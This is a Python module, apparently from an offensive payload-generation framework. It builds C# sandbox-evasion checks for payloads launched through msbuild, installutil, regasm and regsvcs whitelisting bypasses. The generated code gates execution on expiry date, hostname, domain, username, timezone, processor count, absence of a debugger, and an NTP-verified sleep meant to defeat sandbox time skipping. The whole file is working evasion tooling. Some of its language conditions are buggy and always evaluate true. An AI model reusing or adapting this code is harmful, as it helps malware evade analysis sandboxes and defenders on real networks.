'''
This file contains the payload sandbox checks for each respective language
'''

from datetime import date
from datetime import timedelta
from Tools.Bypass.bypass_common import bypass_helpers


def senecas_games(bypass_payload):
    # Start checks to determine language
    # Define original values of variables
    num_tabs_required = 0
    check_code = ''

    if bypass_payload.language == 'msbuild':
        check_code += "\npublic override bool Execute()\n{\n"
        if bypass_payload.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = bypass_helpers.randomString()
            RandExpire = bypass_helpers.randomString()

            # Create Payload code
            check_code += '\t' * num_tabs_required + 'DateTime {} = DateTime.Today;\n'.format(RandToday)
            check_code += '\t' * num_tabs_required + 'DateTime {} = {}.AddDays({});\n'.format(RandExpire, RandToday, bypass_payload.required_options["EXPIRE_PAYLOAD"][0])
            check_code += '\t' * num_tabs_required + 'if ({} < {}) {{\n'.format(RandExpire, RandToday)

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["HOSTNAME"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(bypass_payload.required_options["HOSTNAME"][0].lower())

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["TIMEZONE"][0].lower() != 'x':

            check_code += '\t' * num_tabs_required + 'if (TimeZone.CurrentTimeZone.StandardName != "Coordinated Universal Time") {\n'

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["DOMAIN"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (string.Equals("' + bypass_payload.required_options["DOMAIN"][0] + '", System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase)) {\n'

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["PROCESSORS"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (System.Environment.ProcessorCount >= {}) {{\n'.format(bypass_payload.required_options["PROCESSORS"][0])

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = bypass_helpers.randomString()
            rand_char_name = bypass_helpers.randomString()
            check_code += '\t' * num_tabs_required + 'string {} = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n'.format(rand_user_name)
            check_code += '\t' * num_tabs_required + "string[] {} = {}.Split('\\\\');\n".format(rand_char_name, rand_user_name)
            check_code += '\t' * num_tabs_required + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, bypass_payload.required_options["USERNAME"][0])

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["SLEEP"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'var NTPTransmit = new byte[48];NTPTransmit[0] = 0x1B; var secondTransmit = new byte[48]; secondTransmit[0] = 0x1B;  var skip = false;\n'
            check_code += '\t' * num_tabs_required + 'var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            check_code += '\t' * num_tabs_required + 'try { sock.Connect(new IPEndPoint(addr[0], 123)); sock.ReceiveTimeout = 6000; sock.Send(NTPTransmit); sock.Receive(NTPTransmit); sock.Close(); } catch { skip = true; }\n'
            check_code += '\t' * num_tabs_required + 'ulong runTotal=0;for (int i=40; i<=43; ++i){runTotal = runTotal * 256 + (uint)NTPTransmit[i];}\n'
            check_code += '\t' * num_tabs_required + 'var t1 = (new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * runTotal);\n'
            check_code += '\t' * num_tabs_required + 'Thread.Sleep(' + bypass_payload.required_options["SLEEP"][0] + '*1000);\n'
            check_code += '\t' * num_tabs_required + 'var newSock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            check_code += '\t' * num_tabs_required + 'try { var addr2 = Dns.GetHostEntry("us.pool.ntp.org").AddressList; newSock.Connect(new IPEndPoint(addr2[0], 123)); newSock.ReceiveTimeout = 6000; newSock.Send(secondTransmit); newSock.Receive(secondTransmit); newSock.Close(); } catch { skip = true; }\n'
            check_code += '\t' * num_tabs_required + 'ulong secondTotal = 0; for (int i = 40; i <= 43; ++i) { secondTotal = secondTotal * 256 + (uint)secondTransmit[i]; }\n'
            check_code += '\t' * num_tabs_required + 'if (((new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * secondTotal) - t1).Seconds >= ' + bypass_payload.required_options["SLEEP"][0] + ' || skip) {\n'

            # Add a tab for this check
            num_tabs_required += 1

        # Return check information
        return check_code, num_tabs_required
    
    elif bypass_payload.language == "mshta":
        return check_code, num_tabs_required

    elif bypass_payload.language == "regsvr32":
        return check_code, num_tabs_required

    elif bypass_payload.language == 'installutil' or 'installutil_powershell':
        if bypass_payload.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = bypass_helpers.randomString()
            RandExpire = bypass_helpers.randomString()

            # Create Payload code
            check_code += '\t' * num_tabs_required + 'DateTime {} = DateTime.Today;\n'.format(RandToday)
            check_code += '\t' * num_tabs_required + 'DateTime {} = {}.AddDays({});\n'.format(RandExpire, RandToday, bypass_payload.required_options["EXPIRE_PAYLOAD"][0])
            check_code += '\t' * num_tabs_required + 'if ({} < {}) {{\n'.format(RandExpire, RandToday)

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["HOSTNAME"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(bypass_payload.required_options["HOSTNAME"][0].lower())

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["TIMEZONE"][0].lower() != 'x':

            check_code += '\t' * num_tabs_required + 'if (TimeZone.CurrentTimeZone.StandardName != "Coordinated Universal Time") {\n'

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["DEBUGGER"][0].lower() != 'x':

            check_code += '\t' * num_tabs_required + 'if (!System.Diagnostics.Debugger.IsAttached) {\n'

            # Add a tab for this check
            num_tabs_required += 1

        #if bypass_payload.required_options["BADMACS"][0].lower() != 'x':
        #    pass

        if bypass_payload.required_options["DOMAIN"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (string.Equals("' + bypass_payload.required_options["DOMAIN"][0] + '", System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase)) {\n'

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["PROCESSORS"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (System.Environment.ProcessorCount >= {}) {{\n'.format(bypass_payload.required_options["PROCESSORS"][0])

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = bypass_helpers.randomString()
            rand_char_name = bypass_helpers.randomString()
            check_code += '\t' * num_tabs_required + 'string {} = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n'.format(rand_user_name)
            check_code += '\t' * num_tabs_required + "string[] {} = {}.Split('\\\\');\n".format(rand_char_name, rand_user_name)
            check_code += '\t' * num_tabs_required + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, bypass_payload.required_options["USERNAME"][0])

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["SLEEP"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'var NTPTransmit = new byte[48];NTPTransmit[0] = 0x1B; var secondTransmit = new byte[48]; secondTransmit[0] = 0x1B;  var skip = false;\n'
            check_code += '\t' * num_tabs_required + 'var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            check_code += '\t' * num_tabs_required + 'try { sock.Connect(new IPEndPoint(addr[0], 123)); sock.ReceiveTimeout = 6000; sock.Send(NTPTransmit); sock.Receive(NTPTransmit); sock.Close(); } catch { skip = true; }\n'
            check_code += '\t' * num_tabs_required + 'ulong runTotal=0;for (int i=40; i<=43; ++i){runTotal = runTotal * 256 + (uint)NTPTransmit[i];}\n'
            check_code += '\t' * num_tabs_required + 'var t1 = (new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * runTotal);\n'
            check_code += '\t' * num_tabs_required + 'Thread.Sleep(' + bypass_payload.required_options["SLEEP"][0] + '*1000);\n'
            check_code += '\t' * num_tabs_required + 'var newSock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            check_code += '\t' * num_tabs_required + 'try { var addr2 = Dns.GetHostEntry("us.pool.ntp.org").AddressList; newSock.Connect(new IPEndPoint(addr2[0], 123)); newSock.ReceiveTimeout = 6000; newSock.Send(secondTransmit); newSock.Receive(secondTransmit); newSock.Close(); } catch { skip = true; }\n'
            check_code += '\t' * num_tabs_required + 'ulong secondTotal = 0; for (int i = 40; i <= 43; ++i) { secondTotal = secondTotal * 256 + (uint)secondTransmit[i]; }\n'
            check_code += '\t' * num_tabs_required + 'if (((new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * secondTotal) - t1).Seconds >= ' + bypass_payload.required_options["SLEEP"][0] + ' || skip) {\n'

            # Add a tab for this check
            num_tabs_required += 1

        # Return check information
        return check_code, num_tabs_required

    elif bypass_payload.language == 'regasm' or 'regsvcs' or 'regasm_powershell' or 'regsvcs_powershell':
        if bypass_payload.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = bypass_helpers.randomString()
            RandExpire = bypass_helpers.randomString()

            # Create Payload code
            check_code += '\t' * num_tabs_required + 'DateTime {} = DateTime.Today;\n'.format(RandToday)
            check_code += '\t' * num_tabs_required + 'DateTime {} = {}.AddDays({});\n'.format(RandExpire, RandToday, bypass_payload.required_options["EXPIRE_PAYLOAD"][0])
            check_code += '\t' * num_tabs_required + 'if ({} < {}) {{\n'.format(RandExpire, RandToday)

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["HOSTNAME"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(bypass_payload.required_options["HOSTNAME"][0].lower())

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["TIMEZONE"][0].lower() != 'x':

            check_code += '\t' * num_tabs_required + 'if (TimeZone.CurrentTimeZone.StandardName != "Coordinated Universal Time") {\n'

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["DEBUGGER"][0].lower() != 'x':

            check_code += '\t' * num_tabs_required + 'if (!System.Diagnostics.Debugger.IsAttached) {\n'

            # Add a tab for this check
            num_tabs_required += 1

        #if bypass_payload.required_options["BADMACS"][0].lower() != 'x':
        #    pass

        if bypass_payload.required_options["DOMAIN"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (string.Equals("' + bypass_payload.required_options["DOMAIN"][0] + '", System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase)) {\n'

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["PROCESSORS"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (System.Environment.ProcessorCount >= {}) {{\n'.format(bypass_payload.required_options["PROCESSORS"][0])

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = bypass_helpers.randomString()
            rand_char_name = bypass_helpers.randomString()
            check_code += '\t' * num_tabs_required + 'string {} = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n'.format(rand_user_name)
            check_code += '\t' * num_tabs_required + "string[] {} = {}.Split('\\\\');\n".format(rand_char_name, rand_user_name)
            check_code += '\t' * num_tabs_required + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, bypass_payload.required_options["USERNAME"][0])

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["SLEEP"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'var NTPTransmit = new byte[48];NTPTransmit[0] = 0x1B; var secondTransmit = new byte[48]; secondTransmit[0] = 0x1B;  var skip = false;\n'
            check_code += '\t' * num_tabs_required + 'var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            check_code += '\t' * num_tabs_required + 'try { sock.Connect(new IPEndPoint(addr[0], 123)); sock.ReceiveTimeout = 6000; sock.Send(NTPTransmit); sock.Receive(NTPTransmit); sock.Close(); } catch { skip = true; }\n'
            check_code += '\t' * num_tabs_required + 'ulong runTotal=0;for (int i=40; i<=43; ++i){runTotal = runTotal * 256 + (uint)NTPTransmit[i];}\n'
            check_code += '\t' * num_tabs_required + 'var t1 = (new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * runTotal);\n'
            check_code += '\t' * num_tabs_required + 'Thread.Sleep(' + bypass_payload.required_options["SLEEP"][0] + '*1000);\n'
            check_code += '\t' * num_tabs_required + 'var newSock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            check_code += '\t' * num_tabs_required + 'try { var addr2 = Dns.GetHostEntry("us.pool.ntp.org").AddressList; newSock.Connect(new IPEndPoint(addr2[0], 123)); newSock.ReceiveTimeout = 6000; newSock.Send(secondTransmit); newSock.Receive(secondTransmit); newSock.Close(); } catch { skip = true; }\n'
            check_code += '\t' * num_tabs_required + 'ulong secondTotal = 0; for (int i = 40; i <= 43; ++i) { secondTotal = secondTotal * 256 + (uint)secondTransmit[i]; }\n'
            check_code += '\t' * num_tabs_required + 'if (((new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * secondTotal) - t1).Seconds >= ' + bypass_payload.required_options["SLEEP"][0] + ' || skip) {\n'

            # Add a tab for this check
            num_tabs_required += 1

        # Return check information
        return check_code, num_tabs_required

    else:
        return '', 0
